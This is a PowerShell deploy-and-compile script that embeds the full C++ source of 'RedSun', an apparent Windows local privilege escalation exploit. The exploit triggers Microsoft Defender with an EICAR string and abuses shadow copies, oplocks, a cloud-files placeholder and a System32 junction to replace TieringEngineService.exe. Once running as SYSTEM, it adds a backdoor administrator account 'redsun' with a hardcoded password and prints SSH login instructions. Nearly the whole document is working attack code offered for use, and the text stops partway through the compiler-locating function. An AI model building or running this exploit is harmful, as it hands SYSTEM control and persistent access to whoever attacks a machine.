# Single-file RedSun deploy + compile script.
#
# - RedSun.cpp is embedded verbatim below in a PowerShell here-string.
# - Finds any installed MSVC (VS 2017+) via vswhere, or scans conventional install paths.
# - Compiles with the flags/libs the source needs (/DUNICODE + CldApi, ntdll, synchronization,
#   user32, advapi32, ole32, netapi32).
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File .\deploy_redsun.ps1
#   powershell -ExecutionPolicy Bypass -File .\deploy_redsun.ps1 -OutDir C:\Users\Public\RedSun
#
# -SourceOverride <path>   Use an alternate RedSun.cpp instead of the embedded source.
# -KeepSource              Keep RedSun.cpp / .obj / _build.bat after a successful build.

param(
    [string]$OutDir         = "$PWD\RedSun-build",
    [string]$SourceOverride = $null,
    [switch]$KeepSource
)

$ErrorActionPreference = 'Stop'

function Info($m) { Write-Host "[+] $m" -ForegroundColor Cyan }
function Warn($m) { Write-Host "[!] $m" -ForegroundColor Yellow }
function Die($m)  { Write-Host "[x] $m" -ForegroundColor Red; exit 1 }

# --- Embedded RedSun.cpp ---
# Single-quoted here-string: no PowerShell interpolation, so $ and backticks and
# EICAR scramble-bytes are preserved byte-for-byte. Only `'@` at column 0 closes.
$CPP = @'


// It gets funnier as time passes...

#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <winternl.h>
#include <ntstatus.h>
#include <cfapi.h>
#include <lm.h>

#pragma comment(lib,"synchronization.lib")
#pragma comment(lib,"sas.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"CldApi.lib")
#pragma comment(lib,"netapi32.lib")


typedef struct _FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;

typedef struct _FILE_RENAME_INFORMATION {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
    union {
        BOOLEAN ReplaceIfExists;  // FileRenameInformation
        ULONG Flags;              // FileRenameInformationEx
    } DUMMYUNIONNAME;
#else
    BOOLEAN ReplaceIfExists;
#endif
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, * PFILE_RENAME_INFORMATION;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;


typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR  DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)



HMODULE h = LoadLibrary(L"ntdll.dll");
HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
    PHANDLE            DirectoryHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
    ) = (NTSTATUS(WINAPI*)(
        PHANDLE            DirectoryHandle,
        ACCESS_MASK        DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes
        ))GetProcAddress(hm, "NtOpenDirectoryObject");;
NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
    HANDLE  DirectoryHandle,
    PVOID   Buffer,
    ULONG   Length,
    BOOLEAN ReturnSingleEntry,
    BOOLEAN RestartScan,
    PULONG  Context,
    PULONG  ReturnLength
    ) = (NTSTATUS(WINAPI*)(
        HANDLE  DirectoryHandle,
        PVOID   Buffer,
        ULONG   Length,
        BOOLEAN ReturnSingleEntry,
        BOOLEAN RestartScan,
        PULONG  Context,
        PULONG  ReturnLength
        ))GetProcAddress(hm, "NtQueryDirectoryObject");
NTSTATUS(WINAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass
    ) = (NTSTATUS(WINAPI*)(
        HANDLE                 FileHandle,
        PIO_STATUS_BLOCK       IoStatusBlock,
        PVOID                  FileInformation,
        ULONG                  Length,
        FILE_INFORMATION_CLASS FileInformationClass
        ))GetProcAddress(hm, "NtSetInformationFile");



struct LLShadowVolumeNames
{
    wchar_t* name;
    LLShadowVolumeNames* next;
};
void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
    while (First)
    {
        free(First->name);
        LLShadowVolumeNames* next = First->next;
        free(First);
        First = next;
    }
}

LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber)
{


    if (!criticalerr || !vscnumber)
        return NULL;

    *vscnumber = 0;
    ULONG scanctx = 0;
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
    if (!objdirinfo)
    {
        printf("Failed to allocate required buffer to query object manager directory.\n");
        *criticalerr = true;
        return NULL;
    }
    ZeroMemory(objdirinfo, reqsz);
    NTSTATUS stat = STATUS_SUCCESS;
    do
    {
        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS)
            break;
        else if (stat != STATUS_MORE_ENTRIES)
        {
            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
            *criticalerr = true;
            return NULL;
        }

        free(objdirinfo);
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo)
        {
            printf("Failed to allocate required buffer to query object manager directory.\n");
            *criticalerr = true;
            return NULL;
        }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);
    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
    LLShadowVolumeNames* LLVSScurrent = NULL;
    LLShadowVolumeNames* LLVSSfirst = NULL;
    for (ULONG i = 0; i < ULONG_MAX; i++)
    {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
        {
            free(emptybuff);
            break;
        }
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
        {
            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
            {
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
                {
                    (*vscnumber)++;
                    if (LLVSScurrent)
                    {
                        LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
                        if (!LLVSScurrent->next)
                        {
                            printf("Failed to allocate memory.\n");
                            *criticalerr = true;
                            DestroyVSSNamesList(LLVSSfirst);
                            return NULL;
                        }
                        ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
                        LLVSScurrent = LLVSScurrent->next;
                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                        if (!LLVSScurrent->name)
                        {
                            printf("Failed to allocate memory !!!\n");
                            *criticalerr = true;
                            return NULL;
                        }
                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
                    }
                    else
                    {
                        LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
                        if (!LLVSSfirst)
                        {
                            printf("Failed to allocate memory.\n");
                            *criticalerr = true;
                            return NULL;
                        }
                        ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
                        LLVSScurrent = LLVSSfirst;
                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                        if (!LLVSScurrent->name)
                        {
                            printf("Failed to allocate memory !!!\n");
                            *criticalerr = true;
                            return NULL;
                        }
                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);

                    }

                }
            }
        }




    }
    free(objdirinfo);
    return LLVSSfirst;


}


HANDLE gevent = CreateEvent(NULL, FALSE, NULL, NULL);

DWORD WINAPI ShadowCopyFinderThread(wchar_t* foo)
{

    wchar_t devicepath[] = L"\\Device";
    UNICODE_STRING udevpath = { 0 };
    RtlInitUnicodeString(&udevpath, devicepath);
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS stat = STATUS_SUCCESS;
    HANDLE hobjdir = NULL;
    stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
    if (stat)
    {
        printf("Failed to open object manager directory, error : 0x%0.8X", stat);
        return 1;
    }
    bool criterr = false;
    int vscnum = 0;
    LLShadowVolumeNames* vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum);

    if (criterr)
    {
        printf("Unexpected error while listing current volume shadow copy volumes\n");
        ExitProcess(1);
    }
    

    bool restartscan = false;
    ULONG scanctx = 0;
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
    if (!objdirinfo)
    {
        printf("Failed to allocate required buffer to query object manager directory.\n");
        ExitProcess(1);
    }
    ZeroMemory(objdirinfo, reqsz);
    stat = STATUS_SUCCESS;
    bool srchfound = false;
scanagain:
    do
    {
        scanctx = 0;
        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS)
            break;
        else if (stat != STATUS_MORE_ENTRIES)
        {
            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
            ExitProcess(1);
        }

        free(objdirinfo);
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo)
        {
            printf("Failed to allocate required buffer to query object manager directory.\n");
            ExitProcess(1);
        }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);
    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    if (!emptybuff)
    {
        printf("Failed to allocate memory !!!");
        ExitProcess(1);
    }
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
    wchar_t newvsspath[MAX_PATH] = { 0 };
    wcscpy(newvsspath, L"\\Device\\");

    for (ULONG i = 0; i < ULONG_MAX; i++)
    {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
        {
            free(emptybuff);
            emptybuff = NULL;
            break;
        }
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
        {
            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
            {
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
                {
                    // check against the list if there this is a unique VS Copy
                    LLShadowVolumeNames* current = vsinitial;
                    bool found = false;
                    while (current)
                    {
                        if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
                        {
                            found = true;
                            break;
                        }
                        current = current->next;
                    }
                    if (found)
                        continue;
                    else
                    {
                        srchfound = true;
                        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
                        break;
                    }
                }
            }
        }
    }

    if (!srchfound) {
        restartscan = true;
        goto scanagain;
    }
    if (objdirinfo)
        free(objdirinfo);
    NtClose(hobjdir);

    wchar_t malpath[MAX_PATH] = { 0 };
    wcscpy(malpath, newvsspath);
    wcscat(malpath, &foo[2]);
    UNICODE_STRING _malpath = { 0 };
    RtlInitUnicodeString(&_malpath, malpath);
    OBJECT_ATTRIBUTES objattr2 = { 0 };
    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    HANDLE hlk = NULL;
retry:
    stat = NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, NULL, NULL, NULL);
    if (stat == STATUS_NO_SUCH_DEVICE)
        goto retry;
    if (stat)
    {
        printf("Failed to open file, error : 0x%0.8X\n", stat);
        return 1;

    }
    printf("The sun is shinning...\n");
    

    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING)
    {
        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
        return 0;
    }


    DWORD nbytes = 0;
    SetEvent(gevent);
    ResetEvent(gevent);
    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);

    WaitForSingleObject(gevent, INFINITE);


    CloseHandle(hlk);
    WakeByAddressAll(&gevent);
    CloseHandle(gevent);
    gevent = NULL;

    return ERROR_SUCCESS;
}


void rev(char* s) {

    // Initialize l and r pointers
    int l = 0;
    int r = strlen(s) - 1;
    char t;

    // Swap characters till l and r meet
    while (l < r) {

        // Swap characters
        t = s[l];
        s[l] = s[r];
        s[r] = t;

        // Move pointers towards each other
        l++;
        r--;
    }
}


void DoCloudStuff(wchar_t* syncroot, wchar_t* filename, DWORD filesz = 0x1000)
{

    CF_SYNC_REGISTRATION cfreg = { 0 };
    cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    cfreg.ProviderName = L"SERIOUSLYMSFT"; // let's see how long you can play this game, I'm willing to go as far as you want.
    cfreg.ProviderVersion = L"1.0";
    CF_SYNC_POLICIES syncpolicy = { 0 };
    syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
    syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
    HRESULT hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (hs)
    {
        printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
        return;
    }

    CF_CALLBACK_REGISTRATION callbackreg[1];
    callbackreg[0] = { CF_CALLBACK_TYPE_NONE, NULL };
    void* callbackctx = NULL; 
    CF_CONNECTION_KEY cfkey = { 0 };
    hs = CfConnectSyncRoot(syncroot, callbackreg, callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
    if (hs)
    {
        printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
        return;
    }

    SYSTEMTIME systime = { 0 };
    FILETIME filetime = { 0 };
    GetSystemTime(&systime);
    SystemTimeToFileTime(&systime, &filetime);

    FILE_BASIC_INFO filebasicinfo = { 0 };
    filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
    CF_FS_METADATA fsmetadata = { filebasicinfo, {filesz} };
    CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
    placeholder[0].RelativeFileName = filename;
    placeholder[0].FsMetadata = fsmetadata;


    GUID uid = { 0 };
    wchar_t wuid[100] = {0};
    CoCreateGuid(&uid);
    StringFromGUID2(uid, wuid,100);
    placeholder[0].FileIdentity = wuid;
    placeholder[0].FileIdentityLength = lstrlenW(wuid) * sizeof(wchar_t);
    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    DWORD processedentries = 0;
    //WaitForSingleObject(hevent, INFINITE);
    hs = CfCreatePlaceholders(syncroot, placeholder, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
    if (hs)
    {
        printf("Failed to create placeholder file, error : 0x%0.8X\n", hs);
        return;
    }
    return;


}


static void RunElevatedCmd(const wchar_t* cmdline)
{
    wchar_t buf[512] = { 0 };
    wcscpy(buf, cmdline);
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    if (CreateProcessW(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static void CreateAdminUser()
{
    // Running as SYSTEM: stand up "redsun" in Administrators.
    RunElevatedCmd(L"cmd.exe /c net user redsun NewPass123 /add");
    RunElevatedCmd(L"cmd.exe /c net localgroup administrators redsun /add");
}

bool IsRunningAsLocalSystem()
{

    HANDLE htoken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        printf("OpenProcessToken failed, error : %d\n", GetLastError());
        return false;
    }
    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
    DWORD retsz = 0;
    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
    CloseHandle(htoken);
    if (!res)
        return false;
    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
    if (ret) {
        CreateAdminUser();
        ExitProcess(0);
    }
    return ret;
}
bool r = IsRunningAsLocalSystem();

void LaunchTierManagementEng()
{
    CoInitialize(NULL);
    GUID guidObject = { 0x50d185b9,0xfff3,0x4656,{0x92,0xc7,0xe4,0x01,0x8d,0xa4,0x36,0x1d} };
    void* ret = NULL;
    HRESULT hr = CoCreateInstance(guidObject, NULL, CLSCTX_LOCAL_SERVER, guidObject, &ret);
    

    CoUninitialize();
}

int main()
{
    wchar_t workdir[MAX_PATH] = { 0 };
    ExpandEnvironmentStrings(L"%TEMP%\\RS-", workdir, MAX_PATH);
    
    GUID uid = { 0 };
    wchar_t wuid[100] = { 0 };
    CoCreateGuid(&uid);
    StringFromGUID2(uid, wuid, 100);
    wcscat(workdir, wuid);
    wchar_t filename[] = L"TieringEngineService.exe";
    wchar_t foo[MAX_PATH];
    wsprintf(foo, L"%ws\\%ws", workdir, filename);

    DWORD tid = 0;
    HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ShadowCopyFinderThread, foo, NULL, &tid);

    if (!CreateDirectory(workdir, NULL))
    {
        printf("Failed to create workdir");
        return 1;
    }
    HANDLE hfile = CreateFile(foo, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfile == INVALID_HANDLE_VALUE)
    {
        printf("Failed create spoof work file.\n");
        return 1;
    }
    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
    rev(eicar);
    DWORD nwf = 0;
    WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
    
    // trigger AV response
    CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
    {
        printf("PoC timed out, is real time protection enabled ?");
        return 1;
    }

    IO_STATUS_BLOCK iostat = { 0 };
    FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
    CloseHandle(hfile);
    DoCloudStuff(workdir, filename, sizeof(eicar) - 1);
    
    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    SetEvent(gevent);

    WaitOnAddress(&gevent, &gevent, sizeof(HANDLE), INFINITE);
    
    NTSTATUS stat;
    wchar_t ntfoo[MAX_PATH] = { L"\\??\\" };
    wcscat(ntfoo, foo);
    UNICODE_STRING _foo = { 0 };
    RtlInitUnicodeString(&_foo, ntfoo);
    OBJECT_ATTRIBUTES _objattr = { 0 };
    InitializeObjectAttributes(&_objattr, &_foo, OBJ_CASE_INSENSITIVE, NULL, NULL);

    wchar_t _tmp[MAX_PATH] = { 0 };
    wsprintf(_tmp, L"\\??\\%s.TMP", workdir);
    MoveFileEx(workdir,_tmp,MOVEFILE_REPLACE_EXISTING);
    if (!CreateDirectory(workdir, NULL))
    {
        printf("Failed to re-create directory.\n");
        return 1;
    }
    LARGE_INTEGER fsz = { 0 };
    fsz.QuadPart = 0x1000;
    stat = NtCreateFile(&hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ, FILE_SUPERSEDE, NULL, NULL, NULL);
    if (stat)
    {
        printf("Failed to re-open spoof work file, error : 0x%0.8X\n", stat);
        return 1;
    }
    DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING)
    {
        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
        return 1;
    }

    HANDLE hmap = CreateFileMapping(hfile, NULL, PAGE_READONLY, NULL, NULL, NULL);
    void* mappingaddr = MapViewOfFile(hmap, PAGE_READONLY, NULL, NULL, NULL);
    
    DWORD nbytes = 0;
    GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
    UnmapViewOfFile(mappingaddr);
    CloseHandle(hmap);

    
    {
        wchar_t _tmp[MAX_PATH] = { 0 };
        wsprintf(_tmp, L"\\??\\%s.TEMP2", workdir);

        PFILE_RENAME_INFORMATION pfri = (PFILE_RENAME_INFORMATION)malloc(sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
        ZeroMemory(pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
        pfri->ReplaceIfExists = TRUE;
        pfri->FileNameLength = (sizeof(wchar_t) * wcslen(_tmp));
        memmove(&pfri->FileName[0], _tmp, (sizeof(wchar_t) * wcslen(_tmp)));
        stat = _NtSetInformationFile(hfile, &iostat, pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)), (FILE_INFORMATION_CLASS)10);
        _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
    }
    wchar_t _rp[MAX_PATH] = { L"\\??\\" };
    wcscat(_rp, workdir);
    UNICODE_STRING _usrp = { 0 };
    RtlInitUnicodeString(&_usrp, _rp);
    InitializeObjectAttributes(&_objattr, &_usrp, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hrp = NULL;
    stat = NtCreateFile(&hrp, FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
    if (stat)
    {
        printf("Failed to re-open work directory.\n");
        return 1;
    }
    

    wchar_t rptarget[] = { L"\\??\\C:\\Windows\\System32" };
    DWORD targetsz = wcslen(rptarget) * 2;
    DWORD printnamesz = 1 * 2;
    DWORD pathbuffersz = targetsz + printnamesz + 12;
    DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
    rdb->Reserved = NULL;
    rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
    rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
    rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);
    DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
    HeapFree(GetProcessHeap(), NULL, rdb);

    HANDLE hlk = NULL;
    
    HANDLE htimer = CreateWaitableTimer(NULL, FALSE, NULL);
    LARGE_INTEGER duetime = { 0 };
    GetSystemTimeAsFileTime((LPFILETIME)&duetime);
    ULARGE_INTEGER _duetime = { duetime.LowPart, duetime.HighPart };
    _duetime.QuadPart += 0x2FAF080;
    duetime.QuadPart = _duetime.QuadPart;
    CloseHandle(hfile);
    for (int i = 0; i < 1000; i++)
    {
        wchar_t malpath[] = { L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe" };
        UNICODE_STRING _malpath = { 0 };
        RtlInitUnicodeString(&_malpath, malpath);
        OBJECT_ATTRIBUTES objattr2 = { 0 };
        InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        IO_STATUS_BLOCK iostat = { 0 };
        stat = NtCreateFile(&hlk, GENERIC_WRITE, &objattr2, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, NULL, NULL, NULL);
        if (!stat)
            break;
        Sleep(20);
    }


    if (stat != STATUS_SUCCESS)
    {
        printf("Something went wrong.\n");
        return 1;
    }
    printf("The red sun shall prevail.\n");
    
    CloseHandle(hlk);
    CloseHandle(hrp);
    


    wchar_t mx[MAX_PATH] = { 0 };
    GetModuleFileName(GetModuleHandle(NULL), mx, MAX_PATH);
    wchar_t mx2[MAX_PATH] = { 0 };
    ExpandEnvironmentStrings(L"%WINDIR%\\System32\\TieringEngineService.exe", mx2, MAX_PATH);
    CopyFile(mx, mx2, FALSE);
    LaunchTierManagementEng();

    // Poll for the SYSTEM side to finish creating the account.
    bool created = false;
    for (int i = 0; i < 40; i++) {
        USER_INFO_0* ui = NULL;
        if (NetUserGetInfo(NULL, L"redsun", 0, (LPBYTE*)&ui) == NERR_Success) {
            NetApiBufferFree(ui);
            created = true;
            break;
        }
        Sleep(250);
    }

    printf("\n");
    if (created) {
        printf("[+] Defender-mediated EoP complete. New local admin created:\n");
        printf("      username: redsun\n");
        printf("      password: NewPass123\n");
        printf("    sshd's administrators_authorized_keys already authorizes your key for admins.\n");
        printf("    Log back in with:  ssh -i winvm_key redsun@<vm-ip>\n");
    } else {
        printf("[!] Account 'redsun' did not appear within 10s.\n");
        printf("    SYSTEM-side may still be in progress; re-check with 'net user redsun'.\n");
    }

    return 0;
}
'@

# --- Resolve source ---
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$srcPath = Join-Path $OutDir 'RedSun.cpp'

if ($SourceOverride) {
    if (-not (Test-Path $SourceOverride)) { Die "Source override not found: $SourceOverride" }
    Info "Using source override: $SourceOverride"
    Copy-Item $SourceOverride $srcPath -Force
} else {
    Info "Writing embedded RedSun.cpp ($($CPP.Length) chars)"
    [IO.File]::WriteAllText($srcPath, $CPP, [System.Text.UTF8Encoding]::new($false))
}

# --- Find MSVC ---
function Find-VcVarsBat {
    $vswhere = "$Env:ProgramFiles\Microsoft Visual Studio\Installer\vswhere.exe"
    if (-not (Test-Path $vswhere)) {
        $vswhere = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    }
    if (Test-Path $vswhere) {
        $install = & $vswhere -latest -products '*' -requires 'Microsoft.VisualStudio.Component.VC.Tools.x86.x64' -property installationPath 2>$null
        if ($install) {
            $bat = Join-Path $install 'VC\Auxiliary\Build\vcvars64.bat'
            if (Test-Path $bat) { return $bat }
        }
    }
    $roots = @("${Env:ProgramFiles}\Microsoft Visual Studio", "${Env:ProgramFiles(x86)}\Microsoft Visual Studio") |
             Where-Object { Test-Path $_ }
